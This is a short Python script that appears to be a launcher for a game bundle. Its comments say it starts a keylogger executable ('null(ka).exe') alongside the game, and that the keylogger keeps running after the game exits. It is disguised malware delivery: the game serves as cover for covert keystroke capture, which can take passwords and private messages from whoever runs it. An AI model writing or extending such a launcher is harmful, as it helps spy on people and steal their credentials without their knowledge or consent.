#The subprocesser isn't working try downloading another module for it
import subprocess

# Launch the keylogger
keylogger_process = subprocess.Popen("C:/Users/aanan/OneDrive/Desktop/Game-20230801T162858Z-001/Game/null(ka).exe")

# Launch the game
game_process = subprocess.Popen("C:/Users/aanan/OneDrive/Desktop/Game-20230801T162858Z-001/Game/game/game.exe")

# Wait for the game to exit
game_process.wait()

# Once the game has exited, the keylogger process will continue to run



